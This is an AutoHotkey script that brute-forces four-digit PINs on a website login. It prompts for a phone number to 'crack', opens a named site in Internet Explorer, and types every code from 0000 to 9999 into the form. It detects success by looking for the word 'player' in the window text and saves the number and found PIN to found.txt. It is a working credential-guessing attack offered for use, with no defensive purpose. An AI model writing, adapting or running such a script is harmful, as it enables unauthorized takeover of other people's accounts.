#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory
	
^Numpad0::
	;WinGetText text, A
	;MsgBox %text%
	ExitApp 0
return

^m::
	InputBox accountnumber, "Phone number prompt", "What number do you want to crack?"
	CoordMode, Mouse, Screen
	Run, "C:\Program Files\Internet Explorer\iexplore.exe" ballardassassin.com
	Sleep 3000
	MouseClick, Left, 910, 760, 1, 0
	Sleep 1500
	MouseClick, Left, 675, 327, 2, 0
	Send %accountnumber%
	MouseClick, Left, 675, 750, 1, 0
	Sleep 2500
	failCheck := "OK"
	WinGetText failCheckText, A
	if InStr(failCheckText, failCheck)
	{
		
		MsgBox No!
		ExitApp 1
	}
	else
	{
	MouseClick, Left, 675, 327, 1, 0
	start=0000
	finish=9999
	Loop %finish%
	{
		if start < 10
		{
			Send 000%start%
		}
		else if start < 100
		{
			Send 00%start%
		}
		else if start < 1000
		{
			Send 0%start%
		}
		else if start < finish
		{
			Send %start%
		}
		else if start = finish
		{
			Exit 0
		}
		needle := "player"
		WinGetText text, A
		if InStr(text, needle)
		{
			boof := start - 1
			FileAppend 
			(
			`n
			%accountnumber%
			`n
			%boof%
			), found.txt
			resultant := "found it" + "`n" + %accountnumber% + "`n" + %boof%
			MsgBox, Ok, Result, %resultant%
			Break
		}
		start++
		Sleep 25
		Send `b`b`b`b
	}
	}
	Exit 0
return